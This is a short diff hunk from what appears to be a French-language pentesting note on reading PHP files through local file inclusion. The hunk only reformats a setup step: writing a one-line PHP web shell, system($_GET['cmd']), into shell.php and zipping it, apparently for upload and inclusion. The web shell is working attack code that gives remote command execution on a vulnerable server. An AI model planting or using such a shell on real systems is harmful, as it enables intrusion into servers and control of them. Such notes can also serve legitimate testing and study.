@@ -11,8 +11,12 @@ Lire un fihier php via LFI:
 - Setup :
 
 vim shell.php
-	
-	<?php system($_GET['cmd']); ?>
+
+```php
+<?php 
+	system($_GET['cmd']); 
+?>
+```
 
 zip shell.zip shell.php
 
